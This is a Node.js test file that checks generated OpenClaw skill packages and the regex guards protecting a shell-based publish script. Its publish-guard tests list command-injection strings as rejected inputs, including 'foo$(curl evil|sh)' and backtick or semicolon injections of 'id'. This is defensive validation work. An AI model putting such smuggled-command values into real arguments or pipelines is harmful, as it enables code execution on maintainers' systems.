#!/usr/bin/env node
// The OpenClaw skill package (.openclaw/skills/) is generated from skills/ by
// scripts/build-openclaw-skills.js. These tests fail if the committed copies are
// stale (ruleset drift) or if a description breaks OpenClaw's one-line <160 rule.

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const { NAMES, render, outPath, sourceBody, DESCRIPTIONS } = require('../scripts/build-openclaw-skills');
const { SLUG_RE, VERSION_RE } = require('../scripts/publish-openclaw-skills');

for (const name of NAMES) {
  test(`${name}: committed OpenClaw skill matches the generator`, () => {
    const onDisk = fs.readFileSync(outPath(name), 'utf8').replace(/\r\n/g, '\n');
    assert.equal(onDisk, render(name), 'stale — run: node scripts/build-openclaw-skills.js');
  });

  test(`${name}: body is the canonical skills/${name} body, verbatim`, () => {
    const onDisk = fs.readFileSync(outPath(name), 'utf8').replace(/\r\n/g, '\n');
    assert.ok(onDisk.endsWith(sourceBody(name)), 'body drifted from skills/' + name);
  });

  test(`${name}: description is one line under 160 chars`, () => {
    const d = DESCRIPTIONS[name];
    assert.ok(d.length <= 160 && !d.includes('\n'), 'description too long or multiline');
  });
}

// publish-openclaw-skills.js interpolates slugs and the version into a shell
// command, so these two regexes are the only thing standing between a directory
// name in a PR and code execution on the maintainer's publish run.
test('publish guard: every real skill slug passes SLUG_RE', () => {
  for (const name of NAMES) {
    assert.ok(SLUG_RE.test(name), `${name} would be rejected by the publish guard`);
  }
});

test('publish guard: SLUG_RE rejects shell metacharacters', () => {
  const hostile = [
    'foo$(curl evil|sh)',
    'foo`id`',
    'foo;id',
    'foo&&id',
    'foo id',          // spaces split into extra argv
    'foo"bar',
    "foo'bar",
    '../escape',
    'foo\nbar',        // anchors must not stop at a newline
    'Foo',             // uppercase is not a slug
    '-foo',
    'foo-',
  ];
  for (const s of hostile) {
    assert.ok(!SLUG_RE.test(s), `SLUG_RE must reject ${JSON.stringify(s)}`);
  }
});

test('publish guard: VERSION_RE accepts semver, rejects injection', () => {
  for (const v of ['4.8.4', '1.0.0-rc.1', '1.0.0+build.5']) {
    assert.ok(VERSION_RE.test(v), `VERSION_RE must accept ${v}`);
  }
  for (const v of ['1.0.0; id', '1.0.0$(id)', '1.0.0 `id`', '1.0.0\nid']) {
    assert.ok(!VERSION_RE.test(v), `VERSION_RE must reject ${JSON.stringify(v)}`);
  }
});
